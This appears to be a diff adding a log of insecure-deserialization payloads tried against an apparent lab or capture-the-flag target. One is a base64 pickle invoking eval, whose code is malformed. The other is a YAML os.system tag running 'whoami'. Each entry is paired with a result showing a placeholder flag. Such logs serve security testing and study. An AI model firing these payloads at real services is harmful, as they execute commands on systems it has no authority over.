@@ -1,0 +1,6 @@
+payload: gASVEgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwKcHJpbnQoMSkyXZSFlFKULg==
+result: {'success': True, 'data': '{\'data\': "pickle error: unmatched \']\' (<string>, line 1) | Command executed: SECRET_FLAG_DATA_123", \'status\': \'success\'}', 'error': None}
+---
+payload: !!python/object/apply:os.system ['whoami']
+result: {'success': True, 'data': '{\'data\': \'decode error: could not determine a constructor for the tag \\\'tag:yaml.org,2002:python/object/apply:os.system\\\'\\n  in "<unicode string>", line 1, column 1:\\n    !!python/object/apply:os.system  ... \\n    ^ | Command executed: SECRET_FLAG_DATA_123\', \'status\': \'success\'}', 'error': None}
+---
